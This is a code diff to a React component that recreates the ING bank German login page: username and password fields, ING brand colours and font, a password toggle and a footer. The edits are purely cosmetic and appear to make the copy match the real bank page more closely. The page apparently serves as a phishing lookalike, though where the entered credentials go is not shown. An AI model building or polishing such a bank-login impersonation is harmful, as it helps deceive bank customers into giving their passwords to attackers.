@@ -9,13 +9,13 @@ import youtubeAsset from "@/assets/youtube.svg.asset.json";
 
 const ORANGE = "#FF6200";
 const ORANGE_HOVER = "#E55A00";
-const LINK_BLUE = "#004C93";
+const LINK_BLUE = "#525199";
 const TEXT = "#2D2D2D";
 const MUTED = "#5B5B5B";
 const PAGE_BG = "#F6F6F6";
 const CARD_BG = "#FFFFFF";
-const INPUT_BORDER = "#9E9E9E";
-const INPUT_FOCUS = "#004C93";
+const INPUT_BORDER = "#7C7C7C";
+const INPUT_FOCUS = "#B2C2CE";
 const ERROR_COLOR = "#D6301A";
 const FOOTER_BG = "#333333";
 const FONT = "'ING Me', 'INGMe', 'Helvetica Neue', Arial, sans-serif";
@@ -93,7 +93,7 @@ const ING = () => {
 
       {/* Main */}
       <main className="flex-1">
-        <div className="max-w-[1000px] mx-auto px-4 lg:px-6 pt-6 lg:pt-10 pb-10">
+        <div className="max-w-[1000px] mx-auto px-3 lg:px-4 pt-6 lg:pt-10 pb-10">
           <h1
             className="mb-5 lg:mb-6"
             style={{ color: "#333", fontWeight: 400, fontSize: 28, lineHeight: 1.2 }}
@@ -122,7 +122,7 @@ const ING = () => {
                 <div className="grid grid-cols-1 sm:grid-cols-[140px_1fr] gap-y-1 sm:gap-x-4 items-start mb-4">
                   <label
                     htmlFor="ing-username"
-                    style={{ fontSize: 16, color: TEXT, paddingTop: 8 }}
+                    style={{ fontSize: 15, color: TEXT, paddingTop: 8 }}
                   >
                     Benutzername
                   </label>
@@ -140,7 +140,6 @@ const ING = () => {
                       style={{
                         border: `1px solid ${errors.username ? ERROR_COLOR : INPUT_BORDER}`,
                         borderRadius: 8,
-
                         padding: "8px 10px",
                         fontSize: 16,
                         outline: "none",
@@ -149,10 +148,14 @@ const ING = () => {
                         background: "#fff",
                       }}
                       onFocus={(e) => {
-                        if (!errors.username) e.currentTarget.style.borderColor = INPUT_FOCUS;
+                        if (!errors.username) {
+                          e.currentTarget.style.borderColor = INPUT_FOCUS;
+                          e.currentTarget.style.boxShadow = `inset 0 0 0 1px ${INPUT_FOCUS}`;
+                        }
                       }}
                       onBlur={(e) => {
                         if (!errors.username) e.currentTarget.style.borderColor = INPUT_BORDER;
+                        e.currentTarget.style.boxShadow = "none";
                       }}
                     />
                     <p className="mt-2" style={{ fontSize: 13, color: MUTED, lineHeight: 1.4 }}>
@@ -174,11 +177,11 @@ const ING = () => {
                 <div className="grid grid-cols-1 sm:grid-cols-[140px_1fr] gap-y-1 sm:gap-x-4 items-center mb-5">
                   <label
                     htmlFor="ing-password"
-                    style={{ fontSize: 16, color: TEXT }}
+                    style={{ fontSize: 15, color: TEXT }}
                   >
                     Passwort
                   </label>
-                  <div className="flex items-center gap-2">
+                  <div style={{ position: "relative" }}>
                     <input
                       id="ing-password"
                       type={showPassword ? "text" : "password"}
@@ -192,8 +195,7 @@ const ING = () => {
                       style={{
                         border: `1px solid ${errors.password ? ERROR_COLOR : INPUT_BORDER}`,
                         borderRadius: 8,
-
-                        padding: "8px 10px",
+                        padding: "8px 40px 8px 10px",
                         fontSize: 16,
                         outline: "none",
                         fontFamily: "inherit",
@@ -201,17 +203,21 @@ const ING = () => {
                         background: "#fff",
                       }}
                       onFocus={(e) => {
-                        if (!errors.password) e.currentTarget.style.borderColor = INPUT_FOCUS;
+                        if (!errors.password) {
+                          e.currentTarget.style.borderColor = INPUT_FOCUS;
+                          e.currentTarget.style.boxShadow = `inset 0 0 0 1px ${INPUT_FOCUS}`;
+                        }
                       }}
                       onBlur={(e) => {
                         if (!errors.password) e.currentTarget.style.borderColor = INPUT_BORDER;
+                        e.currentTarget.style.boxShadow = "none";
                       }}
                     />
                     <button
                       type="button"
                       aria-label={showPassword ? "Passwort verbergen" : "Passwort anzeigen"}
                       onClick={() => setShowPassword((v) => !v)}
-                      style={{ color: ORANGE, padding: 4 }}
+                      style={{ color: ORANGE, padding: 4, position: "absolute", right: 6, top: "50%", transform: "translateY(-50%)" }}
                     >
                       {showPassword ? (
                         <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
@@ -250,7 +256,7 @@ const ING = () => {
                       fontSize: 16,
                       fontWeight: 700,
                       padding: "10px 28px",
-                      borderRadius: 24,
+                      borderRadius: 4,
                       fontFamily: "inherit",
                       cursor: submitting ? "not-allowed" : "pointer",
                       transition: "background-color .15s",
@@ -375,14 +381,14 @@ const ING = () => {
       {/* Footer */}
       <footer style={{ backgroundColor: FOOTER_BG, color: "#fff" }}>
         <div className="max-w-[1200px] mx-auto px-5 lg:px-10 py-5">
-          <div className="flex flex-wrap items-center gap-x-7 gap-y-3" style={{ fontSize: 15 }}>
+          <div className="flex flex-wrap items-center gap-x-7 gap-y-3" style={{ fontSize: 16 }}>
             {FOOTER_LINKS.map((l) => (
               <a
                 key={l.label}
                 href={l.href}
                 target="_blank"
                 rel="noopener noreferrer"
-                style={{ color: "#fff", fontWeight: 600 }}
+                style={{ color: "#fff", fontWeight: 400 }}
               >
                 {l.label}
               </a>
